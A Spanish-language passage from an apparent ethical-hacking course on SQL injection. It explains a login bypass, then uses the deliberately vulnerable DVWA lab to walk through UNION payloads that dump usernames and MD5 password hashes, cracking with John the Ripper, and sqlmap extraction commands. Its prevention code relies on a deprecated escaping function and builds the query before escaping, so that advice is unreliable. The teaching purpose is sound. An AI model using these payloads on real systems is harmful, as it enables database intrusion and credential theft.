Algunos de los comandos más utilizados en SQL pueden ser los siguientes:

_Crear tabla:_

```
CREATE TABLE ‘opweb’ (…)
```

_Insertar información:_

```
insert into opweb (field1,field2) values (data1,data2)
```

_Consultas:_

```
select * from opweb group_by field
```

_Especificando campos:_

```
select field1,field2 from opweb
```

_Filtrando valores:_

```
select * from opweb where field1 > value
```

_Combinar resultados:_

```
select … UNION select …
```

##### [](https://openwebinars.net/academia/aprende/ethical-hacking-introduccion/1717/#formularios-de-login)FORMULARIOS DE LOGIN

Para hacer la comprobación _usuario:contraseña_ en una base de datos se realizará con la siguiente consulta:

```
sql = SELECT * FROM usuarios WHERE usuario = ‘$usuario’ and password = ‘$pass’;
```

Si no se toman las medidas necesarias, podría **_aceptar lógica_** en sus campos:

```
sql = SELECT * FROM usuarios WHERE usuario = ‘opweb’ and password = ‘1234’ OR ‘1’=‘1’;
```

La contraseña no será la introducida en primera instancia pero si _acepta lógica_ reconocerá que la primera parte no es válida pero la segunda `1 = 1` sí que se cumple siempre, por lo que tendrá acceso.

##### [](https://openwebinars.net/academia/aprende/ethical-hacking-introduccion/1717/#prevención)PREVENCIÓN

Se usará la siguiente función:

```
string mysql_real_escape_string (string cadena […])
```

que se encargará de _escapar_ caracteres extraños o que puedan ser considerados parte de la lógica de una consulta, como por ejemplo: `\x00, \n, \r, \, ’, ”`

Por lo que la consulta pasaría a realizarse de la siguiente forma:

```
$consulta = "SELECT * FROM usuarios WHERE 
usuario='{$_POST['usuario']}' AND password='{$_POST['password']}'";
mysql_query($consulta);
```

Donde se están validando ambos campos:

```
$_POST['usuario'] = mysql_real_escape_string($_POST['usuario']);
$_POST['password'] = mysql_real_escape_string($_POST['password']);
```

#### [](https://openwebinars.net/academia/aprende/ethical-hacking-introduccion/1717/#laboratorio)LABORATORIO

##### [](https://openwebinars.net/academia/aprende/ethical-hacking-introduccion/1717/#instalación-del-entorno-dvwa)Instalación del entorno DVWA

```
cd Downloads
wget https://github.com/ethicalhack3r/DVWA/archive/master.zip
unzip master.zip
mv DVWA-master dvwa
cp -r dvwa /var/www/html/
service mysql start
mysql -u root -p
create database dvwa;
exit
nano /var/www/html/dvwa/config/config.inc.php
# Eliminar la contraseña de mysql
service apache2 restart
```

Y ya se debe tener acceso a través de `http://172.16.123.136/dvwa`, con usuario `admin` y contraseña `password` y, por último, pulsar el botón `create database` de la pestaña Setup.

Para todas las pruebas de este curso de introducción a la seguridad debemos asegurarnos de que en la pestaña `DVWA Security` la dificultad está seleccionada como `low`.

##### [](https://openwebinars.net/academia/aprende/ethical-hacking-introduccion/1717/#sql-injection)SQL Injection

Accediendo a la pestaña `SQL Injection` aparece un campo `User ID` en el que se puede insertar un número. Si dicho usuario existe nos devolverá información del mismo.

```
2
```

Al añadir números como 1, 2, 3 recibimos respuesta del usuario que ocupa dicho “id”

---

```
2' and 1=1 #
```

Esto nos devuelve la segunda entrada (Gordon) de la base de datos, por lo que está interpretando la expresión que se encuentra a su derecha

---

```
2' and 1=1 order by 3 #
```

Da un error (_unknown column 3_) ya que no existe dicha columna, porque la consulta solo nos devuelve los campos _First_name_ y _Surname_. Al ordenar la salida nos da la pista de que quizás se puedan ejecutar acciones en la propia consulta

Funciones como las que se pueden encontrar en la documentación oficial `https://dev.mysql.com/doc/refman/5.7/en/information-functions.html`.

---

```
2' and 1=1 union select 1,version() #
```

Efectivamente ejecuta funciones, en este caso nos devuelve la versión concreta de la base de datos.

---

```
2' and 1=1 union select 1,user() #
```

Usuario administrador de la base de datos.

---

```
2' and 1=1 union select 1,database() #
```

Nombre de la base de datos.

---

```
2' and 1=1 union select 1,table_name from information_schema.tables #
```

Nombre de todas las tablas, entre las que destaca una de usuarios “users” a la que podemos atacar. Se pueden lanzar distintas funciones que podemos encontrar en `https://dev.mysql.com/doc/refman/5.7/en/tables-table.html`.

---

```
2' and 1=1 union select 1,table_name from information_schema.tables where table_schema!='mysql' and table_schema!='information_schema' and  table_schema!='performance_schema' #
```

Se filtra la base de datos information_schema, performance_schema y mysql

---

```
2' and 1=1 union select 1,column_name from information_schema.columns where table_name='users' #
```

Se accede dentro de la tabla y se listan las columnas que tiene

---

```
2' and 1=1 union select 1,concat(first_name,0x0a,password) from users #
```

Se obtiene los usuarios con las contraseñas en md5

===================

```
admin    : 5f4dcc3b5aa765d61d8327deb882cf99
Gordon     : e99a18c428cb38d5f260853678922e03
Hack     : 8d3533d75ae2c3966d7e0d4fcc69216b
Pablo     : 0d107d09f5bbe40cade3de5c71e9e9b7
Bob     : 5f4dcc3b5aa765d61d8327deb882cf99
```

Para descifrar la password se puede utilizar algún servicio online como:

```
https://hashkiller.co.uk/md5-decrypter.aspx
```

o con John The Ripper, con el comando:

```
john --format=raw-md5 gordon-md5 --show
```

Donde _gordon-md5_ es un fichero donde hemos almacenado la contraseña cifrada por md5.

##### [](https://openwebinars.net/academia/aprende/ethical-hacking-introduccion/1717/#sql-map)SQL Map

Se debería instalar, por ejemplo, la herramienta CookieManager+ para poder coger la Cookie de la conexión y realizar las pruebas con _Sqlmap_.

Primero se comprobará si es vulnerable a un ataque SQL.

```
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=XXXX"
```

Se obtendrá el usuario administrador de la bbdd:

```
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=XXXX" --current-user
```

La lista de bases de datos:

```
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=XXXX" --dbs
```

Las tablas dentro de nuestra base de datos objetivo:

```
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=XXXX" -D dvwa --tables
```

Lista de columnas dentro de la tabla de usuarios:

```
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=XXXX" -D dvwa -T users --columns
```

Por último, que devuelva una lista de usuarios y contraseñas (md5)

```
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=XXXX" -D dvwa -T users -C user,password,first_name,last_name --dump
```